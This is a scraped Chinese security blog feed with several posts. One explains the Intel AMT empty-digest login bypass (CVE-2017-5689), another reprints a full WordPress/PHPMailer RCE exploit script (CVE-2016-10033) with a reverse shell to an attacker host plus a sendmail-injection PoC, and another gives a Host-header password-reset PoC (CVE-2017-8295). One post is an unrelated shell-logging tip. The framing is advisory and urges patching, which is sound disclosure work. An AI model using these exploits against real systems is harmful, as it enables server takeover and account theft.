漏洞说明这款漏洞编号为CVE-2017-5689，能够影响到英特尔远程管理技术，包括Active Management Technology (AMT), Intel Standard Manageability(ISM)和Intel Small Business Technology (SBT)软件，版本号由6开始到11.6。如果你在电脑上看到过这些标志，那么你很有可能中招了。 漏洞最先由Embedi 研究团队的MaksimMalyutin在二月中旬发现，发现后他立即提交给了英特尔安全团队。 现在大部分系统管理员已经通过补丁更新了系统，Embedi决定披露更多细节。 黑客能够通过发送空的验证字符串来劫持使用英特尔芯片的电脑，在了解其中的原理之前我们得先回答下面几个问题： 什么是Intel AMT？Intel AMT漏洞出现在哪里？黑客怎样利用这个漏洞？ 什么是Intel AMT？英特尔通过其 vPro 商务处理器平台提供了 Intel Active Management Technology(AMT)技术，这项技术能让IT管理人员远程管理和修复PC、工作站和服务器。 这项预设的功能使用基于Web的控制页面，通过远程端口16992和16993让管理员远程管理系统。 Intel AMT Web界面甚至可以在系统关机时运作，因为它集成在芯片中，所以可以独立于操作系统运作，只要机器连接了电源和网线。 Intel AMT漏洞出现在哪里？为了防止功能被未授权的用户滥用，AMT服务会使用HTTP摘要认证和Kerberos验证机制。 权限提升漏洞就出现在Intel AMT Web界面通过HTTP摘要认证协议认证用户的环节，这是个基于挑战/应答(Challenge/Response)方式的身份认证系统。 在解释漏洞之前我们先了解一下摘要认证的原理，摘要认证包含以下这些步骤： 用户先发起一个没有认证证书的登陆请求，作为响应，服务器回复一个随机数（称作”nonce“）、HTTP方法以及请求的URI。接下来用户就会被提示输入用户名和密码。输入后，客户端就会发送一个加密的字符串(user_response)，字符串是使用一个单向的加密函数生成的一个消息摘要（message digest），该摘要由用户名、密码、给定的nonce值、HTTP方法，以及所请求的URI生成。而服务器端也会通过数据库中的用户名密码计算一个类似的加密字符串(computed_response)。服务器使用strncmp()函数对两个字符串进行比较，如果二者相符就会让用户登陆Intel AMT Web界面。 而Intel AMT漏洞正是出现在strncmp()函数中。 语法：1strncmp (string_1, string_2 , length) 其中length参数定义了多少个字符会被比较 Strncmp()是一个二进制安全字符串比较函数，所谓二进制安全就是指在一个二进制文件上所执行的不更改文件内容的功能或者操作，其本质上将操作输入作为原始的、无任何特殊格式意义的数据流。函数的返回值包括负整数，0和正整数，取决于string_1是否比string_2大，如果二者相等，则返回0。 存在问题的代码：12if(strncmp(computed_response, user_response, response_length))exit(0x99); 很明显，要认证成功，变量user_response的值必须等于computed_response，因此无论长度如何，strncmp()函数的返回值必须为0。 但是写这段代码的程序员错误地吧user_response的长度放到了strncmp()函数中，而非computed_response。 黑客如何利用？要想利用漏洞，未经授权的用户只需要发送空的user_response值。 由于strncmp()错误地用user_response变量来认证用户，因此，发送null值就会让比较很熟认为user_response与computed_response相等，从而通过验证。 攻击示例：12345678910111213141516171819202122232425262728GET /index.htm HTTP/1.1Host: 127.0.0.1:16992User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveHTTP/1.1 401 UnauthorizedWWW-Authenticate: Digestrealm=»Digest:048A0000000000000000000000000000»,nonce=»qTILAAUFAAAjY7rDwLSmxFCq5EJ3pH/n»,stale=»false»,qop=»auth»Content-Type: text/htmlServer: AMTContent-Length: 678Connection: closeGET /index.htm HTTP/1.1Host: 127.0.0.1:16992User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveAuthorization: Digest username=»admin»,realm=»Digest:048A0000000000000000000000000000»,nonce=»qTILAAUFAAAjY7rDwLSmxFCq5EJ3pH/n», uri=»/index.htm», response=»»,qop=auth, nc=00000001, cnonce=»60513ab58858482c» 12345678HTTP/1.1 200 OKDate: Thu, 4 May 2017 16:09:17 GMTServer: AMTContent-Type: text/htmlTransfer-Encoding: chunkedCache-Control: no cacheExpires: Thu, 26 Oct 1995 00:00:00 GMT04E6 漏洞危害攻击者还可以使用Keyboard Video Mouse (KVM)功能，这个功能内置在Intel AMT Web控制平台中，KVM能够让系统管理员远程控制系统，能够执行的操作包括： “[攻击者]可以远程加载执行任意程序，读写文件（使用常规的文件管理器）” ，研究人员在论文中写道，“使用IDE-R (IDERedirection)，黑客还可以远程更改启动设备，比如吧其他虚拟镜像作为启动设备。”“使用SOL (Serial over LAN), [攻击者]能够远程开关机/重启/重置系统，还可以对BIOS选项进行编辑。”也就是说，黑客可以做任何事情，可以登陆机器、执行恶意活动，包括修改系统和安装那些无法检测的恶意软件。 升级固件修复系统漏洞影响的英特尔管理固件版本包括6.x, 7.x, 8.x 9.x, 10.x, 11.0,11.5和11.6，不过在6以前和11.6以后的版本则不受影响。 英特尔已经将漏洞评级为高危，并且发布了新的固件版本。于此同时，英特尔还发布了一些指导文件，一份用于检测工作站是否运行了AMT, ISM或SBT，一份用于检测系统是否存在漏洞，还有针对不能立即升级的企业的修复指导。 研究员Bart Blaze在GitHub上也发布了一款简单的修复工具，基于英特尔的指导文件制作。 Cerberus Security在GitHub上也发布了一款检测AMT漏洞脚本,基于python语言。 受影响的用户只需要下载运行其中的DisableAMT.exe，这个文件会关闭Windows操作系统（x86和x64系统）中的AMT功能。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"Intel AMT 漏洞","slug":"Intel-AMT-漏洞","permalink":"http://blog.unixmen.cn/tags/Intel-AMT-漏洞/"}]},{"title":"Shell实时命令历史记录","slug":"Shell实时命令历史记录","date":"2017-05-09T08:14:31.000Z","updated":"2017-05-09T08:17:46.854Z","comments":true,"path":"2017/05/09/Shell实时命令历史记录/","link":"","permalink":"http://blog.unixmen.cn/2017/05/09/Shell实时命令历史记录/","excerpt":"","text":"文章简述本文简要介绍了实时记录Shell终端历史命令的一种方法，该方法可将linux shell执行命令历史记录到日志文件中，可配合日志服务器，可把日志传送过去，安全性高。日志记录内容包括：命令执行时间戳，主机名，登陆用户名，PPID，客户端IP地址，执行命令工作目录及执行命令等信息。 安装rsyslog服务 安装rsyslog 1yum install rsyslog 启动rsyslog 12systemctl enable rsyslog.servicesystemctl start rsyslog.service 修改配置文件 修改/etc/bashrc将以下内容加入到/etc/bashrc文件下 1export PROMPT_COMMAND=&apos;history -a;command=$(history 1);logger -p local1.notice -t bash -i &quot;user=$USER,ppid=$PPID,from=$SSH_CLIENT,pwd=$PWD,command:$command &quot;&apos; 修改/etc/rsyslog.conf 1echo &quot;local1.notice /var/log/.command.log&quot; &gt;&gt;/etc/rsyslog.conf 重启rsyslog 1systemctl restart rsyslog.service 测试如果正常的情况下，在文件 /var/log/.command.log下会记录类似如下格式的日志文件。1May 9 15:59:10 localhost bash[8145]: user=root,ppid=18370,from=10.100.0.2 53033 22,pwd=/root,command: 1083 ls -ltr","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"运维","slug":"技术文档/运维","permalink":"http://blog.unixmen.cn/categories/技术文档/运维/"},{"name":"命令行","slug":"技术文档/运维/命令行","permalink":"http://blog.unixmen.cn/categories/技术文档/运维/命令行/"}],"tags":[{"name":"命令行","slug":"命令行","permalink":"http://blog.unixmen.cn/tags/命令行/"},{"name":"历史","slug":"历史","permalink":"http://blog.unixmen.cn/tags/历史/"},{"name":"history","slug":"history","permalink":"http://blog.unixmen.cn/tags/history/"},{"name":"运维","slug":"运维","permalink":"http://blog.unixmen.cn/tags/运维/"}]},{"title":"PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）","slug":"PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）","date":"2017-05-05T01:33:21.000Z","updated":"2017-05-09T08:26:20.563Z","comments":true,"path":"2017/05/05/PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）/","link":"","permalink":"http://blog.unixmen.cn/2017/05/05/PHPMailer曝远程代码执行高危漏洞（CVE-2016-10033）/","excerpt":"","text":"【2017.5.4更新】昨天曝出了两个比较热门的漏洞，一个是CVE-2016-10033，另一个则为CVE-2017-8295。从描述来看，前者是WordPress Core 4.6一个未经授权的RCE漏洞。不过实际上，这就是去年12月份FreeBuf已经报道的漏洞，因此我们在原文基础上进行更新。 这次漏洞公告就是PHPMailer漏洞利用细节在WordPress核心中的实现。未经授权的攻击者利用漏洞就能实现远程代码执行，针对目标服务器实现即时访问，最终导致目标应用服务器的完全陷落。无需插件或者非标准设置，就能利用该漏洞。实际上Wordfence当时就曾经提到过该漏洞影响到了WP Core。 最新的这则公告提到了PHP mail()函数的新利用向量，可在MTA – Exim4之上利用该漏洞，Exim在如Debian或Ubuntu等系统中都是默认安装的。这样一来也就增加了此类攻击的范围和漏洞的严重性。具体为利用host字段注入了恶意数据，进入到了mail函数，再利用sendmail (实际上是软连接到的exim4)命令的-be 参数来执行命令。 之所以到现在才公布这部分细节，是期望给予WordPress和其它收到影响的软件提供商更多时间来升级受影响的Mail库。除此之外，也是针对CVE-2017-8295漏洞留出更多的修复时间。 漏洞利用详情参见：https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html 影响范围： 本次公告中提到的RCE PoC基于WordPress 4.6实现，不过其它版本的WordPress也可能受到影响。 视频演示PoC：https://www.youtube.com/watch?v=ZFt_S5pQPX0 更新：PoC代码已经公布，请站长们尽快升级！ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167#!/bin/bash## __ __ __ __ __# / / ___ ____ _____ _/ / / / / /___ ______/ /_____ __________# / / / _ \\/ __ `/ __ `/ / / /_/ / __ `/ ___/ //_/ _ \\/ ___/ ___/# / /___/ __/ /_/ / /_/ / / / __ / /_/ / /__/ ,&lt; / __/ / (__ )# /_____/\\___/\\__, /\\__,_/_/ /_/ /_/\\__,_/\\___/_/|_|\\___/_/ /____/# /____/### WordPress 4.6 - Remote Code Execution (RCE) PoC Exploit# CVE-2016-10033## wordpress-rce-exploit.sh (ver. 1.0)### Discovered and coded by## Dawid Golunski (@dawid_golunski)# https://legalhackers.com## ExploitBox project:# https://ExploitBox.io## Full advisory URL:# https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html## Exploit src URL:# https://exploitbox.io/exploit/wordpress-rce-exploit.sh### Tested on WordPress 4.6:# https://github.com/WordPress/WordPress/archive/4.6.zip## Usage:# ./wordpress-rce-exploit.sh target-wordpress-url### Disclaimer:# For testing purposes only### -----------------------------------------------------------------## Interested in vulns/exploitation?### .;lc&apos;# .,cdkkOOOko;.# .,lxxkkkkOOOO000Ol&apos;# .&apos;:oxxxxxkkkkOOOO0000KK0x:&apos;# .;ldxxxxxxxxkxl,.&apos;lk0000KKKXXXKd;.# &apos;:oxxxxxxxxxxo;. .:oOKKKXXXNNNNOl.# &apos;&apos;;ldxxxxxdc,. ,oOXXXNNNXd;,.# .ddc;,,:c;. ,c: .cxxc:;:ox:# .dxxxxo, ., ,kMMM0:. ., .lxxxxx:# .dxxxxxc lW. oMMMMMMMK d0 .xxxxxx:# .dxxxxxc .0k.,KWMMMWNo :X: .xxxxxx:# .dxxxxxc .xN0xxxxxxxkXK, .xxxxxx:# .dxxxxxc lddOMMMMWd0MMMMKddd. .xxxxxx:# .dxxxxxc .cNMMMN.oMMMMx&apos; .xxxxxx:# .dxxxxxc lKo;dNMN.oMM0;:Ok. &apos;xxxxxx:# .dxxxxxc ;Mc .lx.:o, Kl &apos;xxxxxx:# .dxxxxxdl;. ., .. .;cdxxxxxx:# .dxxxxxxxxxdc,. &apos;cdkkxxxxxxxx:# .&apos;:oxxxxxxxxxdl;. .;lxkkkkkxxxxdc,.# .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.# .&apos;:oxxxxxxxxx.ckkkkkkkkxl,.# .,cdxxxxx.ckkkkkxc.# .&apos;:odx.ckxl,.# .,.&apos;.## https://ExploitBox.io## https://twitter.com/Exploit_Box## -----------------------------------------------------------------rev_host=&quot;192.168.57.1&quot;function prep_host_header() &#123;cmd=&quot;$1&quot;rce_cmd=&quot;\\$&#123;run&#123;$cmd&#125;&#125;&quot;;# replace / with $&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;#sed &apos;s^/^$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;^g&apos;rce_cmd=&quot;`echo $rce_cmd | sed &apos;s^/^\\$&#123;substr&#123;0&#125;&#123;1&#125;&#123;\\$spool_directory&#125;&#125;^g&apos;`&quot;# replace &apos; &apos; (space) with#sed &apos;s^ ^$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$^g&apos;rce_cmd=&quot;`echo $rce_cmd | sed &apos;s^ ^\\$&#123;substr&#123;10&#125;&#123;1&#125;&#123;\\$tod_log&#125;&#125;^g&apos;`&quot;#return &quot;target(any -froot@localhost -be $rce_cmd null)&quot;host_header=&quot;target(any -froot@localhost -be $rce_cmd null)&quot;return 0&#125;#cat exploitbox.ansintro=&quot;DQobWzBtIBtbMjFDG1sxOzM0bSAgICAuO2xjJw0KG1swbSAbWzIxQxtbMTszNG0uLGNka2tPT09rbzsuDQobWzBtICAgX19fX19fXxtbOEMbWzE7MzRtLiwgG1swbV9fX19fX19fG1s1Q19fX19fX19fG1s2Q19fX19fX18NCiAgIFwgIF9fXy9fIF9fX18gG1sxOzM0bScbWzBtX19fXBtbNkMvX19fX19cG1s2Q19fX19fX19cXyAgIF8vXw0KICAgLyAgXy8gICBcXCAgIFwvICAgLyAgIF9fLxtbNUMvLyAgIHwgIFxfX19fXy8vG1s3Q1wNCiAgL19fX19fX19fXz4+G1s2QzwgX18vICAvICAgIC8tXCBfX19fIC8bWzVDXCBfX19fX19fLw0KIBtbMTFDPF9fXy9cX19fPiAgICAvX19fX19fX18vICAgIC9fX19fX19fPg0KIBtbNkMbWzE7MzRtLmRkYzssLDpjOy4bWzlDG1swbSxjOhtbOUMbWzM0bS5jeHhjOjs6b3g6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eG8sG1s1QxtbMG0uLCAgICxrTU1NMDouICAuLBtbNUMbWzM0bS5seHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG1sVy4gb01NTU1NTU1LICBkMBtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s1QxtbMG0uMGsuLEtXTU1NV05vIDpYOhtbNUMbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDLhtbMTszNG1keHh4eHhjG1s2QxtbMG0ueE4weHh4eHh4eGtYSywbWzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2Qy4bWzE7MzRtZHh4eHh4YyAgICAbWzBtbGRkT01NTU1XZDBNTU1NS2RkZC4gICAbWzM0bS54eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eHhjG1s2QxtbMG0uY05NTU1OLm9NTU1NeCcbWzZDG1szNG0ueHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4YxtbNUMbWzBtbEtvO2ROTU4ub01NMDs6T2suICAgIBtbMzRtJ3h4eHh4eDoNChtbMzdtIBtbNkMbWzE7MzRtLmR4eHh4eGMgICAgG1swbTtNYyAgIC5seC46bywgICAgS2wgICAgG1szNG0neHh4eHh4Og0KG1szN20gG1s2QxtbMTszNG0uZHh4eHh4ZGw7LiAuLBtbMTVDG1swOzM0bS4uIC47Y2R4eHh4eHg6DQobWzM3bSAbWzZDG1sxOzM0bS5keHh4eCAbWzBtX19fX19fX18bWzEwQ19fX18gIF9fX19fIBtbMzRteHh4eHg6DQobWzM3bSAbWzdDG1sxOzM0bS4nOm94IBtbMG1cG1s2Qy9fIF9fX19fX19fXCAgIFwvICAgIC8gG1szNG14eGMsLg0KG1szN20gG1sxMUMbWzE7MzRtLiAbWzBtLxtbNUMvICBcXBtbOEM+G1s3QzwgIBtbMzRteCwNChtbMzdtIBtbMTJDLxtbMTBDLyAgIHwgICAvICAgL1wgICAgXA0KIBtbMTJDXF9fX19fX19fXzxfX19fX19fPF9fX18+IFxfX19fPg0KIBtbMjFDG1sxOzM0bS4nOm9keC4bWzA7MzRtY2t4bCwuDQobWzM3bSAbWzI1QxtbMTszNG0uLC4bWzA7MzRtJy4NChtbMzdtIA0K&quot;intro2=&quot;ICAgICAgICAgICAgICAgICAgIBtbNDRtfCBFeHBsb2l0Qm94LmlvIHwbWzBtCgobWzk0bSsgLS09fBtbMG0gG1s5MW1Xb3JkcHJlc3MgQ29yZSAtIFVuYXV0aGVudGljYXRlZCBSQ0UgRXhwbG9pdBtbMG0gIBtbOTRtfBtbMG0KG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAgICAgICAgICBEaXNjb3ZlcmVkICYgQ29kZWQgQnkgICAgICAgICAgICAgICAgG1s5NG18G1swbQobWzk0bSsgLS09fBtbMG0gICAgICAgICAgICAgICAbWzk0bURhd2lkIEdvbHVuc2tpG1swbSAgICAgICAgICAgICAgICAgIBtbOTRtfBtbMG0gChtbOTRtKyAtLT18G1swbSAgICAgICAgIBtbOTRtaHR0cHM6Ly9sZWdhbGhhY2tlcnMuY29tG1swbSAgICAgICAgICAgICAgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAbWzk0bXwbWzBtChtbOTRtKyAtLT18G1swbSAiV2l0aCBHcmVhdCBQb3dlciBDb21lcyBHcmVhdCBSZXNwb25zaWJpbGl0eSIgG1s5NG18G1swbSAKG1s5NG0rIC0tPXwbWzBtICAgICAgICAqIEZvciB0ZXN0aW5nIHB1cnBvc2VzIG9ubHkgKiAgICAgICAgICAbWzk0bXwbWzBtIAoKCg==&quot;echo &quot;$intro&quot; | base64 -decho &quot;$intro2&quot; | base64 -dif [ &quot;$#&quot; -ne 1 ]; thenecho -e &quot;Usage:\\n$0 target-wordpress-url\\n&quot;exit 1fitarget=&quot;$1&quot;echo -ne &quot;\\e[91m[*]\\033[0m&quot;read -p &quot; Sure you want to get a shell on the target &apos;$target&apos; ? [y/N] &quot; choiceechoif [ &quot;$choice&quot; == &quot;y&quot; ]; thenecho -e &quot;\\e[92m[*]\\033[0m Guess I can&apos;t argue with that... Let&apos;s get started...\\n&quot;echo -e &quot;\\e[92m[+]\\033[0m Connected to the target&quot;# Serve payload/bash script on :80RCE_exec_cmd=&quot;(sleep 3s &amp;&amp; nohup bash -i &gt;/dev/tcp/$rev_host/1337 0&lt;&amp;1 2&gt;&amp;1) &amp;&quot;echo &quot;$RCE_exec_cmd&quot; &gt; rce.txtpython -mSimpleHTTPServer 80 2&gt;/dev/null &gt;&amp;2 &amp;hpid=$!# Save payload on the target in /tmp/rcecmd=&quot;/usr/bin/curl -o/tmp/rce $rev_host/rce.txt&quot;prep_host_header &quot;$cmd&quot;curl -H&quot;Host: $host_header&quot; -s -d &apos;user_login=admin&amp;wp-submit=Get+New+Password&apos; $target/wp-login.php?action=lostpasswordecho -e &quot;\\n\\e[92m[+]\\e[0m Payload sent successfully&quot;# Execute payload (RCE_exec_cmd) on the target /bin/bash /tmp/rcecmd=&quot;/bin/bash /tmp/rce&quot;prep_host_header &quot;$cmd&quot;curl -H&quot;Host: $host_header&quot; -d &apos;user_login=admin&amp;wp-submit=Get+New+Password&apos; $target/wp-login.php?action=lostpassword &amp;echo -e &quot;\\n\\e[92m[+]\\033[0m Payload executed!&quot;echo -e &quot;\\n\\e[92m[*]\\033[0m Waiting for the target to send us a \\e[94mreverse shell\\e[0m...\\n&quot;nc -vv -l 1337echoelseecho -e &quot;\\e[92m[+]\\033[0m Responsible choice ;) Exiting.\\n&quot;exit 0fiecho &quot;Exiting...&quot;exit 0 上述另外一个最新曝出编号为CVE-2017-8295的漏洞，严重程度被评级为介于Medium和High之间（而非Critical），影响到WordPress Core &lt;= 4.7.4以下的版本。 这个漏洞的概况是这样的：WordPress有个密码重置功能，该特性中存在漏洞——在某些情况下可能导致攻击者在无需身份认证的情况下拿到密码重置链接，这样一来攻击者就能获取目标用户的WordPress账户了。 这个漏洞源于WordPress默认在创建密码重置邮件的时候，采用不受信任的数据。具体的利用方式点击这里查看。目前WordPress官方暂无针对该问题的解决方案，可以采用如下临时解决方案： 用户可启用UserCanonicalName实施静态SERVER_NAME值 https://httpd.apache.org/docs/2.4/mod/core.html#usecanonicalname 据作者所说，该问题已经向WordPress安全团队进行过多次反馈，最早一次是在去年7月份，但一直没有得到相应的反馈。 【2016.12.27原文】 这次曝出远程代码执行漏洞的是堪称全球最流行邮件发送类的PHPMailer，据说其全球范围内的用户量大约有900万——每天还在持续增多。 GitHub上面形容PHPMailer“可能是全球PHP发送邮件最流行的代码。亦被诸多开源项目所采用，包括WordPress、Drupal、1CRM、Joomla!等”。所以这个漏洞影响范围还是比较广的，漏洞级别也为Critical最高级。 漏洞编码 CVE-2016-10033 影响版本 PHPMailer &lt; 5.2.18 漏洞级别 高危 漏洞描述 独立研究人员Dawid Golunski发现了该漏洞——远程攻击者利用该漏洞，可实现远程任意代码在web服务器账户环境中执行，并使web应用陷入威胁中。攻击者主要在常见的web表单如意见反馈表单，注册表单，邮件密码重置表单等使用邮件发送的组件时利用此漏洞。 不过有关该漏洞的细节信息，研究人员并未披露，期望给予网站管理员更多的时间来升级PHPMailer类，避免受漏洞影响。 漏洞PoC 实际上Dawid Golunski已经做了个可行的RCE PoC，不过会迟一些再发布。关注视频PoC请点击：https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html 更新：PoC代码已经公布，请站长们尽快升级！ 1234567891011121314151617181920212223242526272829303132333435363738394041424344更新：PoC代码已经公布，请站长们尽快升级！&lt;?php /* PHPMailer &lt; 5.2.18 Remote Code Execution (CVE-2016-10033) A simple PoC (working on Sendmail MTA) It will inject the following parameters to sendmail command: Arg no. 0 == [/usr/sbin/sendmail] Arg no. 1 == [-t] Arg no. 2 == [-i] Arg no. 3 == [-fattacker\\] Arg no. 4 == [-oQ/tmp/] Arg no. 5 == [-X/var/www/cache/phpcode.php] Arg no. 6 == [some&quot;@email.com] which will write the transfer log (-X) into /var/www/cache/phpcode.php file. The resulting file will contain the payload passed in the body of the msg: 09607 &lt;&lt;&lt; --b1_cb4566aa51be9f090d9419163e492306 09607 &lt;&lt;&lt; Content-Type: text/html; charset=us-ascii 09607 &lt;&lt;&lt; 09607 &lt;&lt;&lt; &lt;?php phpinfo(); ?&gt; 09607 &lt;&lt;&lt; 09607 &lt;&lt;&lt; 09607 &lt;&lt;&lt; 09607 &lt;&lt;&lt; --b1_cb4566aa51be9f090d9419163e492306-- See the full advisory URL for details. */ // Attacker&apos;s input coming from untrusted source such as $_GET , $_POST etc. // For example from a Contact form $email_from = &apos;&quot;attacker\\&quot; -oQ/tmp/ -X/var/www/cache/phpcode.php some&quot;@email.com&apos;; $msg_body = &quot;&lt;?php phpinfo(); ?&gt;&quot;; // ------------------ // mail() param injection via the vulnerability in PHPMailer require_once(&apos;class.phpmailer.php&apos;); $mail = new PHPMailer(); // defaults to using php &quot;mail()&quot; $mail-&gt;SetFrom($email_from, &apos;Client Name&apos;); $address = &quot;customer_feedback@company-X.com&quot;; $mail-&gt;AddAddress($address, &quot;Some User&quot;); $mail-&gt;Subject = &quot;PHPMailer PoC Exploit CVE-2016-10033&quot;; $mail-&gt;MsgHTML($msg_body); if(!$mail-&gt;Send()) &#123; echo &quot;Mailer Error: &quot; . $mail-&gt;ErrorInfo; &#125; else &#123; echo &quot;Message sent!\\n&quot;; &#125; 漏洞修复 更新到5.2.18：https://github.com/PHPMailer/PHPMailer 漏洞详情目前已经提交给了PHPMailer官方——官方也已经发布了PHPMailer 5.2.18紧急安全修复，解决上述问题，受影响的用户应当立即升级。详情可参见： https://github.com/PHPMailer/PHPMailer/blob/master/changelog.md https://github.com/PHPMailer/PHPMailer/blob/master/SECURITY.md *本文转自FreeBuf.COM","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"http://blog.unixmen.cn/tags/WordPress/"}]},{"title":"WordPress爆未经授权的密码重置漏洞","slug":"WordPress爆未经授权的密码重置漏洞","date":"2017-05-05T01:14:35.000Z","updated":"2017-05-05T01:28:24.672Z","comments":true,"path":"2017/05/05/WordPress爆未经授权的密码重置漏洞/","link":"","permalink":"http://blog.unixmen.cn/2017/05/05/WordPress爆未经授权的密码重置漏洞/","excerpt":"","text":"漏洞提交者：Dawid Golunski漏洞编号：CVE-2017-8295发布日期：2017-05-03修订版本：1.0漏洞危害：中/高 I. 漏洞WordPress内核&lt;= 4.7.4存在未经授权的密码重置(0day) II. 背景WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统。截止2017年2月，Alexa排名前1000万的站点中约有27.5%使用该管理系统。据报道有超过6000万站点使用WordPress进行站点管理或者作为博客系统。 III. 介绍WordPress的重置密码功能存在漏洞，在某些情况下不需要使用之前的身份令牌验证获取密码重置链接。该攻击可导致攻击者在未经授权的情况下获取用户Wordpress后台管理权限。 IV. 描述该漏洞源于WordPress默认使用不可信的数据。当生成一个密码重置邮件时应当是仅发送给与帐户相关联的电子邮件。从下面的代码片段可以看出，在调用PHP mail()函数前创建了一个From email头 1234567891011121314------[ wp-includes/pluggable.php ]------if ( !isset( $from_email ) ) &#123; // Get the site domain and get rid of www. $sitename = strtolower( $_SERVER[&apos;SERVER_NAME&apos;] ); if ( substr( $sitename, 0, 4 ) == &apos;www.&apos; ) &#123; $sitename = substr( $sitename, 4 ); &#125; $from_email = &apos;wordpress@&apos; . $sitename;&#125;----------------------------------------- 正如我们所看到的，Wordpress为了生成重置邮件创建的一个From/Return-Path(发件人/收件人)头，使用SERVER_NAME变量以获取服务器的主机名。然而，诸如Apache的主流web服务器默认使用由客户端提供的主机名来设置SERVER_NAME变量（参考Apache文档）由于SERVER_NAME可以进行修改，攻击者可以任意设置该值，例如attackers-mxserver.com这将导致Wordpress的$from_email变为wordpress@attackers-mxserver.com，最终导致包含From/Return-Path(发件人/收件人)设置的密码重置邮件发送到了该恶意邮件地址。至于攻击者可以修改哪那一封电子邮件的头信息，这取决于服务器环境（参考PHP文档）基于邮件服务器的配置，可能导致被修改过邮件头的恶意收件人/发件人地址的电子邮件发送给WordPress用户。这使得攻击者能够在不需要进行交互就可以截取本该是需要进行交互才能进行的操作的密码重置邮件。 攻击场景：如果攻击者知道用户的电子邮件地址。为了让密码重置邮件被服务器拒收，或者无法到达目标地址。他们可以先对用户的电子邮件帐户进行DoS攻击（通过发送多个超过用户磁盘配额的大文件邮件或攻击该DNS服务器）某些自动回复可能会附加有邮件发送副本发送多封密码重置邮件给用户，迫使用户对这些没完没了的密码重置邮件进行回复，回复中就包含的密码链接会发送给攻击者。 V. POC如果攻击者将类似下面的请求发送到默认可通过IP地址访问的Wordpress安装页面(IP-based vhost):12345678-----[ HTTP Request ]----POST /wp/wordpress/wp-login.php?action=lostpassword HTTP/1.1Host: injected-attackers-mxserver.comContent-Type: application/x-www-form-urlencodedContent-Length: 56user_login=admin&amp;redirect_to=&amp;wp-submit=Get+New+Password WordPress将触发管理员账户的密码重置功能由于修改了主机头，SERVER_NAME变量将被设置为攻击者所选择的主机名，因此Wordpress会将以下电子邮件头信息和正文传递给/usr/bin/sendmail12345678910------[ resulting e-mail ]-----Subject: [CompanyX WP] Password ResetReturn-Path: &lt;wordpress@attackers-mxserver.com&gt;From: WordPress &lt;wordpress@attackers-mxserver.com&gt;Message-ID: &lt;e6fd614c5dd8a1c604df2a732eb7b016@attackers-mxserver.com&gt;X-Priority: 3MIME-Version: 1.0Content-Type: text/plain; charset=UTF-8Content-Transfer-Encoding: 8bit 有人请求将以下账户的密码进行重置：12http://companyX-wp/wp/wordpress/Username: admin 如果是弄错了，直接忽略该邮件就好。重置密码请访问以下地址：1http://companyx-wp/wp/wordpress/wp-login.php?action=rp&amp;key=AceiMFmkMR4fsmwxIZtZ&amp;login=admin%3E 正如我们看到的，Return-Path, From, 以及Message-ID字段都是攻击者控制的域通过bash脚本替换/usr/sbin/sendmail以执行头的验证：12#!/bin/bashcat &gt; /tmp/outgoing-email VI. 业务影响在利用成功的基础上，攻击者可重置用户密码并且未经授权获取WordPress账户访问权限。 VII. 系统影响WordPress至最新版本4.7.4全部受影响 VIII. 解决方案目前没有官方解决方案可用。作为临时解决方案，用户可以启用UseCanonicalName执行SERVER_NAME静态值（参考Apache） IX. 参考文献https://legalhackers.com https://ExploitBox.io Vendor site: https://wordpress.org 